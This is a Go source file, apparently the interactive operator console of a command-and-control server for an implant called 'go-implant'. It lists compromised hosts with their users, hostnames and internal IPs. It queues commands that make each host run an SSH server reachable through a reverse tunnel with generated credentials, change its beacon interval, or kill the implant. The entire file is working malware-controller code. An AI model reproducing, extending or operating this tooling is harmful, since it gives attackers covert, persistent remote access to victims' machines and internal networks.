package view

import (
	"go-implant/common/communication"
	"go-implant/server/config"
	"go-implant/server/model"
	"fmt"
	"io"
	"log"
	"math/rand"
	"os"
	"strconv"
	"strings"
	"text/tabwriter"
	"time"

	"github.com/chzyer/readline"
	"github.com/fatih/color"
)

// seed random
func init() {
	rand.Seed(time.Now().UnixNano())
}

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func randStringRunes(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

// colors
var green = color.New(color.FgGreen)
var yellow = color.New(color.FgYellow)
var cyan = color.New(color.FgCyan)
var red = color.New(color.FgRed)

func printClientInfo(UID string) {
	client := model.Fetch(UID) // fetch the user (if removed we're doomed!)
	fmt.Printf("UID: %s\n", client.Beacon.UID)
	fmt.Printf("CurrentUser: %s\n", client.Beacon.CurrentUser)
	fmt.Printf("Hostname: %s\n", client.Beacon.Hostname)
	fmt.Printf("OS: %s\n", client.Beacon.OS)
	fmt.Printf("Internal IPs: %s\n", client.Beacon.InternalIPS)
	fmt.Printf("Commands in queue: %s\n", client.Commandqueue)
	fmt.Printf("Sleeptime: %d seconds\n", client.Beacon.Sleeptime)
	fmt.Printf("Last active: %s ago\n", time.Since(client.Lastactive).Truncate(time.Second))
	if client.Username != "" && client.Password != "" && client.Forward != nil {
		for _, listener := range client.Forward.Listeners {
			fmt.Printf("Tunnel active.\n\tAddress: %s\n\tUsername: %s\n\tPassword: %s\n\n", listener.Addr(), client.Username, client.Password)
		}
	} else {
		fmt.Printf("No tunnel active to this host\n\n")
	}
}

// kill client
func assignKill(UID string) {
	fmt.Printf("Killing client %s\n", UID)

	// verify is this correct
	cyan.Print("Are you sure? y/n ")
	var choice string
	fmt.Scanf("%s", &choice)
	if choice != "y" {
		fmt.Println("Aborted killing client")
		return
	}

	client := model.Fetch(UID) // fetch the user (if removed we're doomed!)

	comm := communication.Command{Command: communication.Quit, Args: nil}
	client.Commandqueue = append(client.Commandqueue, comm)

	model.Store(UID, client) // store the modified client
	fmt.Println("Command added to queue.")

	printClientInfo(UID)
}

// remove client record
func removeClient(UID string) {
	fmt.Printf("Removing client record %s\n", UID)

	// verify is this correct
	cyan.Print("Are you sure? y/n ")
	var choice string
	fmt.Scanf("%s", &choice)
	if choice != "y" {
		fmt.Println("Aborted removing client record")
		return
	}

	// remove the client record
	model.Remove(UID)
	fmt.Printf("Client record %s removed\n\n", UID)
}

// Set new sleeptime for client
func setSleeptime(UID string) {

	client := model.Fetch(UID) // fetch the user (if removed we're doomed!)

	fmt.Printf("Sleeptime now: %d seconds\n", client.Beacon.Sleeptime)

	// choose command to delete
	var sleeptime int
	fmt.Print("\n\nNew sleeptime (seconds): ")
	fmt.Scanf("%d", &sleeptime)

	if sleeptime <= 0 {
		red.Println("Invalid sleeptime")
	} else {
		// add the setSleeptime command to the clients queue
		comm := communication.Command{Command: communication.SetSleeptime, Args: []string{strconv.Itoa(sleeptime)}}
		client.Commandqueue = append(client.Commandqueue, comm)

		model.Store(UID, client) // store the modified client
		fmt.Println("Command added to queue.")
		printClientInfo(UID)
	}
}

// remove command from client's queue
func removeCommand(UID string) {
	client := model.Fetch(UID) // fetch the user (if removed we're doomed!)

	fmt.Println("Commands in queue:")
	for i := 0; i < len(client.Commandqueue); i++ {
		fmt.Printf("%d: %s", i, client.Commandqueue[i])
	}

	// choose command to delete
	var commandtodelete int
	fmt.Print("\n\nCommand to delete: ")
	fmt.Scanf("%d", &commandtodelete)

	if len(client.Commandqueue) <= commandtodelete {
		// no such command
		red.Println("Invalid command")
	} else {
		// remove the command at the given index
		client.Commandqueue = append(client.Commandqueue[:commandtodelete], client.Commandqueue[commandtodelete+1:]...)

		model.Store(UID, client) // store the modified client
		fmt.Println("Command removed from queue.")
		printClientInfo(UID)
	}
}

// add command to start ssh to client with uid UID
func assignQuickSSH(UID string) {

	client := model.Fetch(UID) // fetch the user (if removed we're doomed!)

	if client.Forward != nil {
		fmt.Println("This client already has active tunnel open")
		return
	}

	var localsshport = 0 // use first free port on host
	var localsshusername string
	var localsshpassword string
	var remotesshusername string
	var remotesshpassword string
	var remotesshHost string
	var remotesshPort = config.SSHport
	var fromPort = 0 // not used (first free port is used)

	if client.Username == "" && client.Password == "" {
		// generate credentials
		client.Username = randStringRunes(10)
		client.Password = randStringRunes(10)
	}

	localsshusername = client.Username
	localsshpassword = client.Password
	remotesshusername = client.Username
	remotesshpassword = client.Password

	fmt.Print("Remote SSH host: ")
	fmt.Scanf("%s", &remotesshHost)

	// verify info is correct
	cyan.Print("Is everything correct? y/n ")
	var choice string
	fmt.Scanf("%s", &choice)
	if choice != "y" {
		fmt.Println("Aborted adding command")
		return
	}

	s := []string{strconv.Itoa(localsshport), localsshusername, localsshpassword, remotesshusername, remotesshpassword, remotesshHost, strconv.Itoa(remotesshPort), strconv.Itoa(fromPort)}
	comm := communication.Command{Command: communication.ServeSSH, Args: s}

	// add to session
	client.Commandqueue = append(client.Commandqueue, comm)
	fmt.Println("Command added to queue.")

	model.Store(UID, client) // store the modified client
	printClientInfo(UID)
}

// add command to start ssh to client with uid UID
func assignServeSSH(UID string) {

	client := model.Fetch(UID) // fetch the user (if removed we're doomed!)

	var localsshport int
	var localsshusername string
	var localsshpassword string
	var remotesshusername string
	var remotesshpassword string
	var remotesshHost string
	var remotesshPort int
	var fromPort int

	// get arguments from user
	fmt.Print("Port to serve on locally: ")
	fmt.Scanf("%d", &localsshport)
	fmt.Print("Local ssh username: ")
	fmt.Scanf("%s", &localsshusername)
	fmt.Print("Local ssh password: ")
	fmt.Scanf("%s", &localsshpassword)
	fmt.Print("Remote SSH username: ")
	fmt.Scanf("%s", &remotesshusername)
	fmt.Print("Remote SSH password: ")
	fmt.Scanf("%s", &remotesshpassword)
	fmt.Print("Remote SSH host: ")
	fmt.Scanf("%s", &remotesshHost)
	fmt.Print("Remote SSH port: ")
	fmt.Scanf("%d", &remotesshPort)
	fmt.Print("Port to serve on remotely: ")
	fmt.Scanf("%d", &fromPort)

	// verify is this correct
	cyan.Print("Is everything correct? y/n ")
	var choice string
	fmt.Scanf("%s", &choice)
	if choice != "y" {
		fmt.Println("Aborted adding serveSSH command")
		return
	}

	s := []string{strconv.Itoa(localsshport), localsshusername, localsshpassword, remotesshusername, remotesshpassword, remotesshHost, strconv.Itoa(remotesshPort), strconv.Itoa(fromPort)}
	comm := communication.Command{Command: communication.ServeSSH, Args: s}

	// add to session
	client.Commandqueue = append(client.Commandqueue, comm)
	fmt.Println("Command added to queue.")

	model.Store(UID, client) // store the modified client
	printClientInfo(UID)
}

// add command to stop all ssh servings to client sessionNumber
func assignStopSSH(UID string) {

	// verify
	cyan.Print("Do you really want to stop any ssh servers and reverse port forwards running on the client? y/n ")
	var choice string
	fmt.Scanf("%s", &choice)
	if choice != "y" {
		fmt.Println("Aborted stopping stopping ssh servers command")
		return
	}

	client := model.Fetch(UID) // fetch the user (if removed we're doomed!)

	comm := communication.Command{Command: communication.StopSSH, Args: nil}
	client.Commandqueue = append(client.Commandqueue, comm)

	// remove username and password from the user
	client.Username = ""
	client.Password = ""

	model.Store(UID, client) // store the modified client
	fmt.Println("Command added to queue.")

	printClientInfo(UID)
}

////////////////////////////////////////
// new UI functions below

func mainusage(w io.Writer) {
	io.WriteString(w, "commands:\n")
	io.WriteString(w, maincompleter.Tree("    "))
}

func listUIDs() func(string) []string {
	return func(line string) []string {
		names := make([]string, 0)
		clientmap := model.Items()
		for key := range clientmap {
			names = append(names, key)
		}
		return names
	}
}

var maincompleter = readline.NewPrefixCompleter(
	readline.PcItem("sessions"),
	readline.PcItem("interact",
		readline.PcItemDynamic(
			listUIDs(),
		),
	),
	readline.PcItem("forwards"),
	readline.PcItem("help"),
	readline.PcItem("exit"),
)

var interactcompleter = readline.NewPrefixCompleter(
	readline.PcItem("info"),
	readline.PcItem("quickSSH"),
	readline.PcItem("serveSSH"),
	readline.PcItem("stopSSH"),
	readline.PcItem("remove",
		readline.PcItem("command"),
		readline.PcItem("client")),
	readline.PcItem("set", readline.PcItem("sleeptime")),
	readline.PcItem("kill"),
	readline.PcItem("help"),
	readline.PcItem("back"),
)

func interactusage(w io.Writer) {
	io.WriteString(w, "commands:\n")
	io.WriteString(w, interactcompleter.Tree("    "))
}

func filterInput(r rune) (rune, bool) {
	switch r {
	// block CtrlZ feature
	case readline.CharCtrlZ:
		return r, false
	}
	return r, true
}

// Shell - main command shell for user
func Shell() {
	l, err := readline.NewEx(&readline.Config{
		Prompt:          yellow.Sprintf("> "),
		HistoryFile:     "/tmp/readline.tmp",
		AutoComplete:    maincompleter,
		InterruptPrompt: "^C",
		EOFPrompt:       "exit",

		HistorySearchFold:   true,
		FuncFilterInputRune: filterInput,
	})
	if err != nil {
		panic(err)
	}
	defer l.Close()

	log.SetOutput(l.Stderr())
	for {
		line, err := l.Readline()
		if err == readline.ErrInterrupt {
			if len(line) == 0 {
				break
			} else {
				continue
			}
		} else if err == io.EOF {
			break
		}

		line = strings.TrimSpace(line)
		switch {

		case line == "sessions":
			clientmap := model.Items()
			if len(clientmap) <= 0 {
				fmt.Println("No available sessions!")
			} else {
				fmt.Println("Available sessions:")
				w := new(tabwriter.Writer)
				w.Init(os.Stdout, 0, 8, 2, '\t', tabwriter.Debug|tabwriter.AlignRight)
				fmt.Fprintln(w, "UID\tCurrent user\tHostname\tSleeptime\tLast active\t")
				for key, value := range clientmap {
					fmt.Fprintf(w, "%s\t%s\t%s\t%ds\t%s ago\t\n", key, value.Beacon.CurrentUser, value.Beacon.Hostname, value.Beacon.Sleeptime, time.Since(value.Lastactive).Truncate(time.Second))
				}
				fmt.Fprintln(w)
				w.Flush()
			}
		case line == "forwards":
			clientmap := model.Items()
			if len(clientmap) <= 0 {
				fmt.Println("No available sessions!")
			} else {
				fmt.Println("Active forwards:")
				w := new(tabwriter.Writer)
				w.Init(os.Stdout, 0, 8, 2, '\t', tabwriter.Debug|tabwriter.AlignRight)
				fmt.Fprintln(w, "UID\tAddress\tUsername\tPassword\t")
				for key, value := range clientmap {
					if value.Forward != nil {
						for _, listener := range value.Forward.Listeners {
							fmt.Fprintf(w, "%s\t%s\t%s\t%s\t\n", key, listener.Addr(), value.Username, value.Password)
						}
					}
				}
				fmt.Fprintln(w)
				w.Flush()
			}
		case strings.HasPrefix(line, "interact "): // TODO: doesnt work as there is no id
			if model.Exists(line[9:]) {
				interact(line[9:])
			} else {
				fmt.Println("No such session!")
			}
		case line == "help":
			fmt.Println("Available commands:")
			fmt.Println("sessions\t\t\tlist available sessions")
			fmt.Println("help\t\t\t\tprint this help message")
			fmt.Println("exit\t\t\t\texit program")
			fmt.Println("interact <UID>\t\t\tinteract with session <UID>")
			fmt.Println("forwards\t\t\tlist active port forwards")
			//mainusage(l.Stderr())
		case line == "exit":
			goto exit
		case line == "":
		default:
			log.Println("Invalid command. Type 'help' for help")
		}
	}
exit:
}

func interact(UID string) {

	l, err := readline.NewEx(&readline.Config{
		Prompt:          yellow.Sprintf("/interact/%s> ", UID),
		HistoryFile:     "/tmp/interact.tmp",
		AutoComplete:    interactcompleter,
		InterruptPrompt: "^C",
		EOFPrompt:       "exit",

		HistorySearchFold:   true,
		FuncFilterInputRune: filterInput,
	})
	if err != nil {
		panic(err)
	}
	defer l.Close()
	log.SetOutput(l.Stderr())

	for {
		line, err := l.Readline()
		if err == readline.ErrInterrupt {
			if len(line) == 0 {
				break
			} else {
				continue
			}
		} else if err == io.EOF {
			break
		}

		line = strings.TrimSpace(line)
		switch {
		case line == "info":
			printClientInfo(UID)
		case line == "quickSSH":
			assignQuickSSH(UID)
		case line == "serveSSH":
			assignServeSSH(UID)
		case line == "stopSSH":
			assignStopSSH(UID)
		case strings.HasPrefix(line, "remove "):
			switch line[7:] {
			case "client":
				removeClient(UID)
				return
			case "command":
				removeCommand(UID)
			default:
				println("Invalid command. Type 'help' for help")
			}
		case strings.HasPrefix(line, "set "):
			switch line[4:] {
			case "sleeptime":
				setSleeptime(UID)
			default:
				println("Invalid command. Type 'help' for help")
			}
		case line == "kill":
			assignKill(UID)
		case line == "back":
			return
		case line == "help":
			fmt.Println("Available commands:")
			fmt.Println("info\t\t\t\tprint client info")
			fmt.Println("quickSSH\t\t\tcreate reverse SSH tunnel and serve SSHD")
			fmt.Println("serveSSH\t\t\tcreate reverse SSH tunnel and serve SSHD for other hosts")
			fmt.Println("stopSSH\t\t\t\tstop all ssh sessions running on client")
			fmt.Println("remove command\t\t\tremove command from queue")
			fmt.Println("remove client\t\t\tremove this client record (does not interact with the client)")
			fmt.Println("set sleeptime\t\t\tset new sleeptime for client")
			fmt.Println("kill\t\t\t\tkill the client")
			fmt.Println("help\t\t\t\tprint this help message")
			fmt.Println("back\t\t\t\treturn to main menu")
			//interactusage(l.Stderr())
		case line == "":
		default:
			println("Invalid command. Type 'help' for help")
		}
	}
}
